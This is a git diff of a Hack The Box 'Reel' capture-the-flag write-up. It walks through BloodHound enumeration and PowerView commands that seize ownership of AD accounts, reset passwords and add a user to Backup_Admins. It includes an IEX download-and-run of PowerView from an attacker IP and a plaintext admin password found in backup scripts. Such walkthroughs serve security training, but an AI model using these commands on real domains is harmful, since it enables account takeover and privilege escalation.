@@ -153,12 +153,12 @@ After some seconds the HTA file will be downloaded, inspected by the user, and s
 
 We are now on the box as the user **htb\nico**. Interestingly enough this is not a local user but a domain user.
 
-Looking at the AppLocker policy if you are interested in that:
+Look at the AppLocker policy if you are interested in that:
 ```powershell
 Get-ApplockerPolicy -Effective -xml
 ```
 
-In the desktop directory of _nico_ is another file other than user.txt that looks interesting. It is called *cred.xml** and this is the contents:
+In the desktop directory of _nico_ is another file other than user.txt that looks interesting. It is called *cred.xml* and this is the content:
 ```xml
 <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
   <Obj RefId="0">
@@ -231,7 +231,7 @@ We can see that _Tom_ and _Nico_ are group members of **Print Operators** and th
 
 ![Shortest Paths to High Value Targets](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_1.png)
 
-This is no direct path, so we need to look for groups we care about and that BloodHound just doesn't know. If we look at the groups of the users we have manually, we see the group **Backup_Admins** that we need to query in BloodHound.
+This is no direct path, so we need to look for groups we care about and that BloodHound just doesn't know. If we look at the groups of the users manually, we see the group **Backup_Admins** that we need to query in BloodHound.
 ```markdown
 net groups /domain
 ```
@@ -242,10 +242,16 @@ Invoke-Bloodhound -CollectionMethod All
 ```
 
 Now the same query as last time has a lot more information:
-![Shortest Paths to High Value Targets with CollectionMethod All](https://kyuu-ji.github.io/htb-write-up/reel/Image2.png)
 
-If we query for a path from **NICO@HTB.LOCAL** to **BACKUP_ADMINS@HTB.LOCAL** we get see that Nico has _WriteOwner_ permissions **to Herman@htb.local** who has _GenericWrite_ and _WriteDacl_ to the Backup_Admins group:
-![Nico to Backup_Admins group](https://kyuu-ji.github.io/htb-write-up/reel/Image3.png)
+![Shortest Paths to High Value Targets with CollectionMethod All](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_2.png)
+
+If we query for a path from **NICO@HTB.LOCAL** to **BACKUP_ADMINS@HTB.LOCAL** we get see that Nico has _WriteOwner_ permissions to **Herman@htb.local** who has _GenericWrite_ and _WriteDacl_ to the Backup_Admins group:
+
+![Nico to Backup_Admins group](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_3.png)
+
+And the same is true for _Tom_ to **Claire@htb.local**:
+
+![Tom to Backup_Admins group](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_4.png)
 
 All Active Directory privileges are explained on [ADSecurity.org](https://adsecurity.org/?p=3658).
 
@@ -253,16 +259,69 @@ All Active Directory privileges are explained on [ADSecurity.org](https://adsecu
 - GenericWrite: Provides write access to all properties
 - WriteDACL: Provides the ability to modify security on an object which can lead to Full Control of the object
 
-This means we can take ownership with Nico of the Herman account and change his password for example and with that user we can take full control over the Backup_Admins group.
+This means we can take ownership with Nico / Tom of the Herman / Claire account and change the password and with that user we can take full control over the Backup_Admins group.
+
 
 ### Exploiting Active Directory
 
-To exploit that permissions in AD we start the script **PoverView.ps1** from the **PowerSploit** script collection framework which you can find in Tom desktop folder, but I am going to upload it from my local machine.
+To exploit that permissions in AD we start the script **PoverView.ps1** from the **PowerSploit** script collection framework which you can find in Toms desktop folder, but I am going to upload it from my local machine.
 ```powershell
 IEX(New-Object Net.WebClient).downloadString('http://10.10.14.23/PowerView.ps1')
 ```
 
-Taking ownership of Herman:
+Taking ownership of _Claire_ with _Tom_ and set rights:
 ```powershell
+Set-DomainObjectOwner -Identity claire -OwnerIdentity tom
 
+Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
 ```
+
+If we run BloodHound again, we see new permissions **Owns** and **ForcePasswordChange** for _Tom_:
+
+![Tom to Backup_Admins group - Owns Claire](https://kyuu-ji.github.io/htb-write-up/reel/BH_query_5.png)
+
+So we will change the password of _Claire_:
+```powershell
+$pass = ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force
+
+Set-DomainUserPassword Claire -AccountPassword $pass -Verbose
+```
+
+And we have SSH access with _Claire_!
+
+We will abuse the write access to make _Claire_ a member of the Backup_Admin group because she is not a member yet but has ownership.
+
+Adding user to group:
+```powershell
+$cred = New-Object System.Management.Automation.PSCredential('HTB\Claire', $pass)
+
+Add-DomainGroupMember -Identity 'Backup_Admins' -Members Claire -Credential $cred
+```
+
+To verify that worked, we can see the groups with this command
+```powershell
+Get-DomainGroup -MemberIdentity Claire | select SamAccountName
+```
+
+```powershell
+samaccountname                                                                                                                  
+--------------                                                                                                                  
+Restrictions                                                                                                                    
+DR_Site                                                                                                                         
+MegaBank_Users                                                                                                                  
+Domain Users                                                                                                                    
+Backup_Admins     
+```
+
+## Privilege Escalation to Administrator
+
+With _Claire_ we have access to the home folder of _Administrator_ but can't read the flag. Instead there is a folder called **Backup Scripts** that we have access to and in which are different Powershell and text files. If we read all of them and look for the word "password" we will find one:
+```markdown
+type * | findstr password
+
+Output:
+# admin password                                                                                                                
+$password="Cr4ckMeIfYouC4n!"  
+```
+
+If we try this password with SSH and the username Administrator we get in and can read the flag!
